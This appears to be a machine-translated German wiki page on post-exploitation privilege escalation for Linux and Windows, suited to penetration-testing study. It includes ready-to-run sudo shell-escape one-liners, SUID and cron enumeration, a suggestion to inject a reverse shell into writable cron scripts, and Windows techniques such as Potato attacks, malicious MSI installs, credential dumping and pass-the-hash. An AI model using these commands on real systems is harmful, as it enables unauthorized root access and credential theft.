---
title: "Techniken zur Privilege Escalation"
category: techniques
tags: [security, privilege-escalation, linux, windows, post-exploitation]
level: 4
source_sha256: e3353659d2475a3e460419c520d626e16f6a0e2c5917383b515a999255bbe50c
translation: machine
translated_at: '2026-10-24'
---
# Techniken zur Privilege Escalation {#privilege-escalation-techniques}

Privilege Escalation nach der Ausnutzung auf Linux- und Windows-Systemen: SUID-Binaries, Fehlkonfigurationen bei sudo, Kernel-Exploits, Token-Impersonation unter Windows, Unquoted Service Paths und automatisierte Enumeration-Werkzeuge.

## Wichtige Fakten {#key-facts}
- Privilege Escalation verwandelt Zugriff mit niedrigen Rechten in root- bzw. SYSTEM-Zugriff
- GTFOBins.github.io katalogisiert Linux-Binaries, die für Privilege Escalation ausnutzbar sind
- LOLBAS (Living Off the Land Binaries and Scripts) ist das Windows-Pendant
- WinPEAS/LinPEAS automatisieren die Enumeration von Eskalationsvektoren
- Token-Impersonation (Potato-Angriffe) ist die häufigste Eskalation von Windows-Dienstkonten

## Privilege Escalation unter Linux {#linux-privilege-escalation}

### SUID-Binaries {#suid-binaries}
```bash
find / -perm -4000 -type f 2>/dev/null
# Check each result against GTFOBins.github.io
```
SUID-Programme laufen mit den Rechten des Dateibesitzers. Wenn ein SUID-Binary im Besitz von root beliebige Befehle erlaubt, ergibt sich root-Zugriff.

### Fehlkonfigurationen bei sudo {#sudo-misconfigurations}
```bash
sudo -l   # List allowed sudo commands

# Exploitation examples:
# If: (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \;

# If: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# If: (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/sh")'

# If: (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd   # then type !sh
```

### Cron-Jobs {#cron-jobs}
```bash
cat /etc/crontab
ls -la /etc/cron.*
# Look for cron jobs running as root that execute writable scripts
# If script is world-writable: inject reverse shell
```

### Beschreibbare Verzeichnisse im PATH {#writable-path-directories}
Wenn ein Verzeichnis im `PATH` von root für alle beschreibbar ist, lässt sich ein schädliches Binary platzieren, das denselben Namen wie ein Befehl trägt, den root ausführt.

### Kernel-Exploits {#kernel-exploits}
```bash
uname -a            # Check kernel version
# Search exploit-db.com or searchsploit for kernel version
# Examples: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847)
```

### LinPEAS {#linpeas}
Automatisiertes Enumeration-Skript. Es prüft alle oben genannten Punkte sowie:
- Interessante Dateien (Konfigurationen mit Passwörtern, .ssh-Schlüssel)
- Mitgliedschaft in der Docker-Gruppe (Container-Escape)
- Capabilities (`getcap -r / 2>/dev/null`)
- NFS-Freigaben mit no_root_squash

## Privilege Escalation unter Windows {#windows-privilege-escalation}

### Token-Impersonation (Potato-Angriffe) {#token-impersonation-potato-attacks}
Wenn ein Dienstkonto `SeImpersonatePrivilege` besitzt:
- **JuicyPotato** - DCOM-basiert (Windows Server 2016/2019)
- **PrintSpoofer** - Missbrauch des Print Spoolers
- **GodPotato** - neueste Variante, funktioniert auf aktuellen Windows-Versionen
- Eskaliert vom Dienstkonto zu SYSTEM

### Unquoted Service Paths {#unquoted-service-paths}
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
```
Lautet der Dienstpfad `C:\Program Files\My App\service.exe` (ohne Anführungszeichen), probiert Windows folgende Pfade aus:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

Dann wird die schädliche ausführbare Datei an einem Pfad platziert, der früher geprüft wird.

### AlwaysInstallElevated {#alwaysinstallelevated}
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Wenn beide Werte 1 sind: eine schädliche `.msi` erstellen, die mit SYSTEM-Rechten installiert wird.

### WinPEAS {#winpeas}
Automatisierte Enumeration. Prüft Dienste, Registry, geplante Aufgaben, Zugangsdaten und Berechtigungen.

### Speicherorte für Zugangsdaten {#credential-locations}
- **SAM-Datenbank** - `C:\Windows\System32\config\SAM` (NTLM-Hashes)
- **LSASS-Speicher** - zwischengespeicherte Zugangsdaten (Ziel von Mimikatz)
- **Registry** - Autologon-Passwörter, VNC-Passwörter
- **Unattend-/Sysprep-Dateien** - Zugangsdaten aus Deployments
- **Im Browser gespeicherte Passwörter**

## Laterale Bewegung {#lateral-movement}
Bewegung zwischen Rechnern in einem kompromittierten Netzwerk:
- **PsExec** - Remote-Ausführung über SMB (erfordert Admin-Zugangsdaten)
- **WMI** - Remote-Ausführung über Windows Management Instrumentation
- **WinRM** - PowerShell-Remoting
- **Pass-the-Hash** - Authentifizierung direkt mit dem NTLM-Hash
- **RDP** - Remote Desktop mit erbeuteten Zugangsdaten

## Stolperfallen {#gotchas}
- Kernel-Exploits können das System zum Absturz bringen. Vorsichtig testen und einen Plan für den Notfall haben.
- SUID auf Skripten (bash, python) funktioniert aufgrund von Schutzmechanismen des Interpreters möglicherweise nicht wie erwartet.
- Moderne Linux-Kernel und Windows-Versionen haben viele klassische Privilege-Escalation-Vektoren gepatcht. Immer die genaue Version prüfen.
- Mitgliedschaft in der Docker-Gruppe entspricht root-Rechten (Mounten des Host-Dateisystems).
- Die Ausgabe von `sudo -l` mit `env_keep` kann eine `LD_PRELOAD`-Injection ermöglichen.

## Siehe auch {#see-also}
- [[penetration-testing-methodology]] - vollständiger Ablauf eines Penetrationstests
- [[active-directory-attacks]] - lateral movement auf Domänenebene
- [[linux-system-hardening]] - Verhinderung von Privilege Escalation
- [[windows-security-and-powershell]] - Windows-Sicherheitskontrollen
